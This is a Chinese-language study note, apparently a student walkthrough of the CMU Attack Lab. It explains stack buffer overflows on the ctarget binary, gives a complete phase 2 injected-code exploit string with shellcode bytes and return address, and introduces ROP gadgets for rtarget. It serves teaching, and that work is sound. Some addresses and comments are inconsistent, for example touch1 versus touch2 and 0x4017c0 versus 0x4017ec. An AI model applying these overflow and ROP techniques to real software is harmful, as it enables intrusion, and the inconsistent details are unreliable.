## hex2raw

+ 将十六进制的文本转化成字节流
+ 使用方式：采用管道符和输入输出重定向

```
./hex2raw < exploit.txt | ./ctarget -q
```

1. 输入重定向 `<`

**作用**：告诉程序“不要从键盘读数据了，去从这个文件里读”。

2. 管道符|

把**前一个命令的标准输出**，直接连接到**后一个命令的标准输入**。就像一个“管道”把两个程序连起来。

3. 输出重定向

告诉程序“不要把结果输出到屏幕了，存到这个文件里”。

```
cat exploit.txt | ./hex2raw | ./ctarget -q
```

## 得到汇编指令的二进制命令

1. 在.s文件中手写需要的汇编指令
2. 编译

```
gcc -c handwritten.s
```

3. 反汇编

```
objdump -d ./handwritten.o > ./handwritten.asm
```

## phase1

### 1. `getbuf`函数的栈帧布局

从反汇编代码可以看出：

```markdown
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28           sub    $0x28, %rsp   ; 在栈上分配 0x28（40）字节空间
  4017ac:       48 89 e7              mov    %rsp, %rdi    ; 将栈顶地址作为参数传递给 Gets
  4017af:       e8 8c 02 00 00        callq  401a40 <Gets> ; 调用 Gets 函数读取输入
  4017b4:       b8 01 00 00 00        mov    $0x1, %eax    ; 返回值设为 1
  4017b9:       48 83 c4 28           add    $0x28, %rsp   ; 释放栈空间
  4017bd:       c3                    retq                 ; 返回（关键：从栈顶弹出返回地址）
```

- **缓冲区大小**：`sub $0x28, %rsp`指令在栈上分配了 **40 字节**（0x28）的空间用于局部变量 `buf`。这就是文档中提到的 `BUFFER_SIZE`。
- **返回地址的位置**：在 x86-64 架构中，当 `getbuf`被调用时（例如被 `test`函数调用），调用者的返回地址会**自动被压入栈顶**。分配缓冲区后，栈布局如下（从高地址到低地址）：
  - **返回地址**：位于缓冲区之后（即 `%rsp + 40`的位置）。
  - **缓冲区 `buf`**：占用 `%rsp`到 `%rsp + 39`的 40 字节。
  - 因此，返回地址紧邻缓冲区的末尾。

### 2. 缓冲区溢出攻击原理

- **溢出点**：`Gets(buf)`函数不检查输入长度，如果输入字符串超过 40 字节，多出的数据会**覆盖栈上的返回地址**。

- **攻击逻辑**：

  Phase 1 的目标是让 `getbuf`执行 `retq`时，不是返回到 `test`，而是跳转到 `touch1`函数。这需要通过输入字符串覆盖返回地址为 `touch1`的地址（例如 `0x4017c0`）。

- **字符串构造**：

  根据文档第 5 页对 Level 1 的说明，攻击字符串应分为两部分：

  - **前 40 字节**：任意填充数据（如全 `00`），用于填满缓冲区。
  - **第 41–48 字节**：`touch1`的地址（小端序格式，如 `c0 17 40 00 00 00 00 00`），用于覆盖返回地址。

## phase2

+ 因为需要输入参数，所以不能直接跳转，需要注入代码，核心思路是：

1. **注入代码**：将包含特定指令的机器代码注入到栈中
2. **跳转到注入代码**：覆盖返回地址，使其指向注入代码的起始位置
3. **执行注入代码**：注入的代码设置参数并跳转到 `touch2`

+ 不要用jmp

x86-64虽然支持绝对跳转（如`jmp *%rax`或`jmp *0x4017c0`），但这种指令的编码更复杂、字节更长，且在某些上下文中不适用。直接写`jmp 0x4017c0`通常会被汇编器转换为相对跳转形式（如果目标地址在范围内）。

而栈里面计算相对偏移很复杂

+ 用压栈和ret代替

  ```
  pushq $0x4017ec          # 将touch1的地址压栈
  ret                      # 跳转到touch1
  ```

### 1. 确定关键信息

从您的文档中获取以下信息：

- **Cookie 值**：从 `cookie.txt`中获取（示例中为 `0x59b997fa`）
- **touch2 地址**：通过反汇编 `ctarget`查找（0x5561dca0）
- **缓冲区大小**：从 `getbuf`的反汇编代码中确定（`sub $0x28,%rsp`表明为 40 字节）

### 2. 编写注入代码的汇编指令

创建汇编文件（如 `phase2.s`），内容如下：

```
movq $0x59b997fa,%rdi   #para1
push $0x4017c0          # push address touch1
retq                    # jump to touch1
```

**为什么使用这种设计？**

- 

  文档第6页明确建议："Use ret instructions for all transfers of control"

- 

  避免使用 `jmp`或 `call`，因为它们的地址编码复杂

### 3. 获取注入代码的机器码

```
gcc -c phase2.s
objdump -d phase2.o
```

从反汇编输出中提取机器码，例如：

```
48 c7 c7 fa 97 b9 59   # movq $0x59b997fa, %rdi
68 ec 17 40 00         # pushq $0x4017ec
c3                     # retq
```

### 4. 确定注入代码的栈地址

使用 GDB 调试确定缓冲区起始地址：

```
gdb ctarget
(gdb) b getbuf
(gdb) run -q
(gdb) print /x $rsp
```

假设得到的地址是 `0x5561dc78`，这就是注入代码的起始位置。

### 5. 构造攻击字符串

创建 `phase2.txt`，内容结构如下：

```
[注入代码的机器码] [填充至40字节] [注入代码的起始地址]
```

具体示例：

```
/* 注入代码的机器码（13字节） */
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
/* 填充至40字节（27字节的00） */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00
/* 返回地址：指向注入代码起始位置（小端序） */
78 dc 61 55 00 00 00 00
```

### 6. 执行攻击

```
./hex2raw < phase2.txt | ./ctarget -q
```

## phase3

`touch3`的C语言代码

```c
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

`touch3`中调用了`hexmatch`，它的C语言代码为：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

与2类似，区别在于需要存储字符串

字符串存在栈中，因为`s`的位置是随机的，为了避免被覆盖，所以存在`test`的栈上

<img src="https://pic2.zhimg.com/v2-dcd7fd081b2c60ed0443adfa044fbb27_1440w.jpg" alt="img" style="zoom:50%;" />

# part2 ROP

## phase1

在第二部分中，我们要攻击的是`rtarget`，它的代码内容与第一部分基本相同，但是攻击它却比第一部分要难得多，主要是因为它采用了两种策略来对抗缓冲区溢出攻击

- 栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码
- 限制可执行代码区域。它限制栈上存放的代码是不可执行的。

解决思路：

+ 不注入函数
+ 利用现有的代码片段拼凑出所需要的

**举个例子：**

`rtarget`有这样一个函数：

```c
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
```

它的汇编代码字节级表示为：

```c
0000000000400f15 <setval_210>:
    400f15: c7 07 d4 48 89 c7   movl $0xc78948d4,(%rdi)
    400f1b: c3                  retq
```

查表可知，取其中一部分字节序列 48 89 c7 就表示指令`movq %rax, %rdi`，这整句指令的地址为`0x400f15`，于是从`0x400f18`开始的代码就可以变成下面这样：

```c
movq %rax, %rdi
ret
```

这个小片段就可以作为一个`gadget`为我们所用。

其它一些可以利用的代码都在文件`farm.c`中展示了出来



